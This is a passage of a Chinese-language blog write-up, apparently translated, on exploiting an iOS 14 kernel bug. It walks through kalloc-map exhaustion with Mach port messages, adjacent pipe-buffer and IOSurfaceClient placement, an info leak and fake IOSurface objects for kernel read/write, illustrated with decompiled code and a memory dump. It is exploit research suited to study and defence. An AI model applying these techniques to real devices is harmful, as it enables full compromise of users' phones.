class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">32</span> * v4;       <span class="comment">/* aka v6 = v4 &lt;&lt; 5 */</span></span><br><span class="line">  a1-&gt;m.total_surfaces_created = v6 + <span class="number">1</span>;</span><br><span class="line">  *new_surface_idp = v6;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么这个代码库将创建的IOSurface对象的总数移到左边五位，尚不明白，但我们看到IOSurfaceRoot有自己的alloc_handles实现。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOSurfaceRoot::alloc_handles</span><span class="params">(IOSurfaceRoot *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  surface_client_array_capacity = a1-&gt;m.surface_client_array_capacity;</span><br><span class="line">  <span class="keyword">if</span> ( surface_client_array_capacity )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( surface_client_array_capacity &gt;&gt; <span class="number">14</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v3 = <span class="number">2</span> * surface_client_array_capacity;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">512</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="built_in">IONewZero</span>((v3 &gt;&gt; <span class="number">3</span>) + <span class="number">8LL</span> * v3);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1-&gt;m.surface_client_array_capacity = v3;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，全系统有一个16384个IOSurface对象的限制，这就是surface_client_array_capacity &gt;&gt; 14的测试。对于超过512的2次方，IOSurfaceRoot的surface_client_array_capacity将增加一倍。因为我们创建的每个IOSurfaceRootUserClient都有相同的IOSurfaceRoot指针，他们都能在IOSurfaceRootUserClient::alloc_handles看到相同的surface_client_array_capacity字段。</p>
<p>因此，我们创建0x10000字节的IOSurfaceClient数组的方法很简单：创建两个IOSurfaceRootUserClient对象，并为它们各自分配4096个IOSurface对象。如果我们特别注意不触发他们的provider IOSurfaceRoot的surface_client_array_capacity的再次翻倍，那么未来任何新的IOSurfaceRootUserClient对象的所有IOSurfaceClient数组也将是0x10000字节。这里最棒的是，我们需要做的就是用一个新的IOSurfaceRootUserClient对象来做一个新的0x10000字节的IOSurfaceClient数组，只需要用它来分配一个IOSurface，因为在那个时候，IOSurfaceRoot的surface_client_array_capacity已经是8192。</p>
<p>尽管0x10000比kalloc_max_prerounded大，但有一个小问题：OSData缓冲区是由kernel_memory_allocate直接分配的，而IOSurfaceClient数组的分配是通过kalloc_ext的，所以会调用kalloc_large。还记得kalloc_large如何调用kalloc_map_for_size吗？</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">vm_map_t</span></span></span><br><span class="line"><span class="function"><span class="title">kalloc_map_for_size</span><span class="params">(<span class="type">vm_size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; kalloc_kernmap_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> kalloc_map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> kernel_map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kalloc_kernmap_size又是0x100001字节，但我们要做的IOSurfaceClient数组只有0x10000字节，所以我们要从kalloc map而不是直接从内核map中分配。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">alloc_map = <span class="built_in">kalloc_map_for_size</span>(size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(alloc_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="keyword">if</span> (alloc_map != kernel_map) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(kernel_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">            addr = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        addr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们只需要让从kalloc地图的分配失败，落入第二个kmem_alloc_flags，它将永远从内核地图分配。让未来的kalloc地图分配失败的最好方法是把它完全填满。</p>
<p>为了填满kalloc地图，我们将使用携带线外端口的Mach消息。这是在iOS 13及以下版本中最过硬的策略之一，因为你可以得到一个Mach端口指针数组，放置在你想要的任何区域。尽管这在iOS 14及以上版本中已经失效，但port指针数组的分配仍然要通过kalloc_ext。经过一些测试，喷洒2000条携带8192个发送权的消息，始终能填满kalloc地图，因为消息中的每个发送权都会创建一个ipc_port指针。</p>
<p>现在kalloc地图被填满了，每一个超过32768字节的kalloc分配都会直接进入内核地图。这个难题的最后一块是要弄清楚我们要使用什么样的受控缓冲区。可以继续使用OSData缓冲区，但是需要大量的代码来读出、写入或释放它们，这与<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/bsd/kern/sys_pipe.c#L308">管道</a>缓冲区不同…</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> pipesize_blocks[] = &#123;<span class="number">512</span>, <span class="number">1024</span>, <span class="number">2048</span>, <span class="number">4096</span>, <span class="number">4096</span> * <span class="number">2</span>, PIPE_SIZE, PIPE_SIZE * <span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * finds the right size from possible sizes in pipesize_blocks</span></span><br><span class="line"><span class="comment"> * returns the size which matches max(current,expected)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">choose_pipespace</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> current, <span class="type">unsigned</span> <span class="type">long</span> expected)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="built_in">sizeof</span>(pipesize_blocks) / <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">int</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> target;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * assert that we always get an atomic transaction sized pipe buffer,</span></span><br><span class="line"><span class="comment">     * even if the system pipe buffer high-water mark has been crossed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">assert</span>(PIPE_BUF == pipesize_blocks[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (expected &gt; current) &#123;</span><br><span class="line">        target = expected;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        target = current;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &gt; <span class="number">0</span> &amp;&amp; pipesize_blocks[i - <span class="number">1</span>] &gt; target) &#123;</span><br><span class="line">        i = i - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pipesize_blocks[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当你使用管道系统调用创建一个管道时，在你向其写入之前，不会为支持的管道缓冲区分配内存。第一次写入的大小首先决定了管道缓冲区的分配量有多大。这正是select_pipespace的作用，pipesize_blocks列出了可能的分配大小。但PIPE_SIZE是什么？</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pipe buffer size, keep moderate in value, pipes take kva space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SIZE       16384</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>pipesize_blocks的最后一个int是16384 * 4，即0x10000。因此，我们需要做的就是直接从内核地图中分配一个管道缓冲区，并向它写入0x10000字节。</p>
<p>因此，前面提到的 “可预测的布局”，将仅仅是并排的0x10000字节的IOSurfaceClient数组和管道缓冲区。一旦我们在我们拥有的某个IOSurfaceRootUserClient对象中提高了surface_client_array_capacity，那么无论这个容量对应的IOSurfaceClient数组后面的管道缓冲区是什么，我们都会被控制在越界读取的缓冲区。</p>
<p>为了让0x10000字节的IOSurfaceClient数组和管道缓冲区并排使用，我们所要做的就是释放大量的空间，然后交替分配0x10000字节的IOSurfaceClient数组和管道缓冲区。对于 “大量的空间”，使用锚点分配左侧的16MB。为什么是左边的16MB？实验得出来的。</p>
<p>在第一阶段结束时，锚点分配左侧的16MB将看起来像这样。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/stage1_16mb.png"></p>
<h2 id="Stage-2-信息泄露"><a href="#Stage-2-信息泄露" class="headerlink" title="Stage 2: 信息泄露"></a>Stage 2: 信息泄露</h2><p>除了在偏移量0x40处携带一个指向它所管理的IOSurface对象的指针外，它还在偏移量0x10处携带一个指向拥有该Surface的IOSurfaceRootUserClient对象的指针。我们将在前面显示的IOSurface关系图中给IOSurfaceClient添加这个字段。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2.png"></p>
<p>大多数IOSurfaceRootUserClient外部方法都遵循这种模式:</p>
<ul>
<li>从IOSurfaceRootUserClient中读取IOSurfaceClient数组。</li>
<li>用用户空间的IOSurface ID索引到该数组中的一个IOSurfaceClient对象。</li>
<li>将IOSurfaceClient中的IOSurface指针传递给一个为该外部方法做工作的函数。</li>
</ul>
<p>如果步骤3中的IOSurface指针指向一个IOSurfaceRootUserClient，会怎么样？那些旨在从该Surface返回字段的外部方法会不会无意中泄露该用户客户端的有价值的字段？</p>
<p>第一阶段在塑造了内核的地址空间之后，实际上还做了一些工作：它将喷射大量的IOSurfaceClient对象，以创建一堆只有这些对象的页面。这样一来，对于一个任意的IOSurface ID，其对应的IOSurfaceClient与其他IOSurfaceClient对象相邻的机会就非常大了。而从现在开始，将把两个相邻的IOSurfaceClient对象称为 “一对”，其中一个在左边，另一个在右边。</p>
<p>现在我们使用重叠策略应用于其中一个对。因为没有办法知道一个surface ID是否会对应于一个对的左边，所以将做一个有根据的猜测。如果猜对了，就会有这样的东西，数组中的蓝色IOSurfaceClient指针指向左边的那个。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2_adjacent.png"></p>
<p>我们的想法是让内核在读取左边的IOSurfaceClient时，从左边的IOSurfaceClient的末端读到右边的IOSurfaceClient上。因为我们可以推导出surface客户端数组的地址，因为它与锚点分配器非常接近，我们将通过增加左边数组中的指针来实现这一目的。</p>
<ul>
<li>offsetof(IOSurfaceClient, IOSurface)是0x40</li>
<li>offsetof(IOSurfaceClient, IOSurfaceRootUserClient) 是0x10</li>
<li>每个IOSurfaceClient对象占用0xa0字节，因为它们住在kext.kalloc.160中。</li>
</ul>
<p>从左边的surface字段到它所在的kext.kalloc.160元素的末端的距离是0xa0-0x40，或者0x60字节。但这只是与左边的IOSurface字段重叠，只够读取右边的vtable指针的偏移量0x0，所以我们需要一个额外的0x10字节来读取右边的IOSurfaceRootUserClient字段。因此，我们将用32位递增原语将左边的指针递增0x70字节。之后，它将指向左边的一半多一点。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2_adjacent_overlap.png"></p>
<p>如果我们猜测的表面ID是错误的，那么在这一点上我们很快就会导致Panic，但如果它是正确的，我们现在可以通过使用与左边对应的表面ID从拥有的IOSurfaceRootUserClient中读取字节。对把IOSurfaceRootUserClient的外部方法当作黑匣子来看待，看到了很多乐趣，但没有什么能让准备好在调用IOSurfaceRootUserClient外部方法28，或者IOSurfaceRootUserClient::s_get_bulk_attachments之后，在0x80字节的结构输出中看到的东西。下面是部分内存转储:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x16eea33f8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0x16eea3408: 00 00 00 00 AO 5C A2 CB E4 FF FF FF 00 F8 10 CC</span><br><span class="line">0x16eea3418: E4 FF FF FF 01 00 00 00 00 00 00 00 80 B2 7F 9A</span><br><span class="line">0x16eea3428: E1 FF FF FF 00 00 00 00 00 00 00 00 28 FB 13 CB</span><br><span class="line">0x16eea3438: E4 FF FF FF E0 A4 A4 CC E4 FF FF FF F8 A4 A4 CC</span><br><span class="line">0x16eea3448: E4 FF FF FF 00 40 3A E7 E8 FF FF FF 00 20 00 00</span><br><span class="line">0x16eea3458: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0x16eea3468: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>该缓冲区包括许多内核指针，但我们感兴趣的是指向:</p>
<ul>
<li>一个IOSurfaceRoot对象，在偏移量0x1c。</li>
<li>一个我们拥有的IOSurfaceRootUserClient对象，在偏移量0x3c。</li>
<li>属于IOSurfaceRootUserClient的IOSurfaceClient数组，在偏移量0x54。<ul>
<li>该数组的容量（除以sizeof(IOSurfaceClient *)）也在偏移量0x5c。</li>
</ul>
</li>
</ul>
<p>唯一的问题是IOSurfaceRootUserClient指针移位了0xf8字节，但这很简单，从它那里减去0xf8就可以得到原始指针。</p>
<h2 id="Stage-3-iOS14-7一个简单技巧"><a href="#Stage-3-iOS14-7一个简单技巧" class="headerlink" title="Stage 3: iOS14.7一个简单技巧"></a>Stage 3: iOS14.7一个简单技巧</h2><p>我们带着指向我们拥有的IOSurfaceRootUserClient对象及其IOSurfaceClient数组的指针进入第三阶段。但这不是普通的IOSurfaceClient数组–它是我们在第1阶段喷出的一个数组，所以在它旁边会有一个管道缓冲器。虽然我们不确定哪个管道缓冲区就在旁边，但我们可以通过在泄露的IOSurfaceClient数组指针上添加0x10000来得出它的地址。我们在第3阶段做的第一件事是以如下方式设置我们在第1阶段喷涂的所有管道缓冲区。</p>
<ul>
<li>偏移量0x0包含衍生的管道缓冲区地址，加上8。</li>
<li>偏移量0x8包含一个假的IOSurfaceClient对象。</li>
<li>偏移量0xa8包含一个假的IOSurface对象。<ul>
<li>假的IOSurface的偏移量0xc0指向管道缓冲区的某个地方，把它的索引写在包含第一阶段所有喷涂管道的数组中。这样做是为了以后能弄清哪个管道缓冲区里有我们的假对象。</li>
</ul>
</li>
</ul>
<p>现在所有的管道缓冲区都设置好了，使用32位的增量，将泄露的IOSurfaceRootUserClient对象的容量提高了一个。</p>
<p>为了弄清楚哪个拥有的IOSurfaceRootUserClient被损坏了，在所有的IOSurfaceRootUserClient::get_surface_use_count中循环查看，当调用IOSurfaceRootUserClient::get_surface_use_count的surface ID索引到相邻的管道缓冲区的开始时，除了错误之外，是否得到其他的东西。如果没有错误，就找到了被破坏的那个，四个字节的输出是持有假IOSurfaceClient和IOSurface对象的管道的索引。</p>
<p>现在我们已经控制了一个IOSurface对象，我们可以用第0阶段谈到的外部方法设置任意的内核读写API。 这样，手机就被攻陷了，我们可以开始越狱。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章里的exp不是一个完整的越狱，而且，exp代码也有限制。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/6/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">buffer0verflooow</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
